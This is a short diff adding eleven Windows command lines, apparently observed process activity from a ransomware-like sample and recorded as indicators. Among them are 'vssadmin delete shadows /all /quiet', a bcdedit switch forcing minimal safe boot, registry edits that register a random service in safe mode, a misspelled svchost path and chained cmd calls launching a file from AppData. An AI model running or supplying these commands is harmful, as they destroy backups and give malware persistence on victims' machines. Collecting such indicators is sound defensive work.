@@ -1,0 +1,11 @@
+wmiadap.exe /F /T /R
+%windir%\System32\svchost.eve –k WerSvcGroup
+conhost.exe 0xFFFFFFFF -ForceV1
+vssadmin delete shadows /all /quiet
+bcdedit.exe /set {current} safeboot minimal
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\VSS /VE /T REG_SZ /F /D Service
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\mXoRpcSsx /VE /T REG_SZ /F /D Service
+REG QUERY HKLM\SYSTEM\CurrentControlSet\Control /v SystemStartOptions
+%CONHOST% "1088015358-1778111623-1306428145949291561678876491840500802412316031-33820320
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window /prefetch:5
+cmd /d /c cmd /d /c cmd /d /c start " " C:\Users\grade1\AppData\Local\PRETTYOCEANluvApplication\PRETTYOCEANApplicationidf.bi.
